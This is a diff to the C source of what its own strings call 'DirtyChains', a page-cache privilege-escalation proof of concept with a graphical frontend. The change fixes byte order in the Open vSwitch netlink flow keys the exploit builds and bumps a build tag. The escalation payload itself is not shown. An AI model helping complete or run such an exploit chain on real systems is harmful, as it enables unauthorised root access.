@@ -53,6 +53,7 @@
 
 #define _GNU_SOURCE
 
+#include <arpa/inet.h>
 #include <ctype.h>
 #include <dirent.h>
 #include <errno.h>
@@ -134,8 +135,12 @@
 #define OVS_TUNNEL_KEY_ATTR_TP_DST 10
 #define OVS_TUNNEL_KEY_ATTR_IPV4_INFO_BRIDGE 16
 
+#ifndef ETH_P_IP
 #define ETH_P_IP 0x0800
+#endif
+#ifndef IPPROTO_TCP
 #define IPPROTO_TCP 6
+#endif
 #define CT_ACTION_COUNT 400
 #define NLA_HDR_LEN 4
 
@@ -514,11 +519,17 @@ static int genl_get_family(struct genl *g, const char *name, int *out)
 /* 一条 flow 的 key：固定 IPv4/TCP 五元组，seq 只用来避免重复 */
 static void flow_key(struct buf *out, int seq)
 {
-    uint32_t src = 0x0A000000u | (uint32_t)((seq & 0xFFFF) + 1);
-    uint32_t dst = 0x0A0000FEu;
-    uint16_t sport = (uint16_t)(10000 + (seq % 50000));
-    uint16_t dport = 443;
-    uint16_t ethertype = ETH_P_IP;
+    /*
+     * netlink 属性里的多字节字段一律要求网络序: 内核侧 nla_get_be16/32 只是
+     * 做类型转换, 不交换字节。这里直接放主机序会被读成反序 —— 例如
+     * ETH_P_IP(0x0800) 变成 0x0008, OVS 校验 "EtherType 8 is less than
+     * min 600" 后返回 -EINVAL。
+     */
+    uint32_t src = htonl(0x0A000000u | (uint32_t)((seq & 0xFFFF) + 1));
+    uint32_t dst = htonl(0x0A0000FEu);
+    uint16_t sport = htons((uint16_t)(10000 + (seq % 50000)));
+    uint16_t dport = htons(443);
+    uint16_t ethertype = htons(ETH_P_IP);
     uint16_t tcpflags = 0;
     uint32_t in_port = 0;
     unsigned char eth[12] = { 0x02, 0, 0, 0, 0, 1, 0x02, 0, 0, 0, 0, 2 };
@@ -3748,7 +3759,7 @@ int ovswrap_main(int argc, char **argv)
 
 #define APP_TITLE       "DirtyChains · 页缓存提权"
 /* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
-#define DF_BUILD        "2026-10-31-r28"
+#define DF_BUILD        "2026-10-31-r29"
 #define APP_SUBTITLE    "六链 PoC 图形前端 · " DF_BUILD
 #define LOG_MAX_LINES   20000
 #define PTY_COLS        110
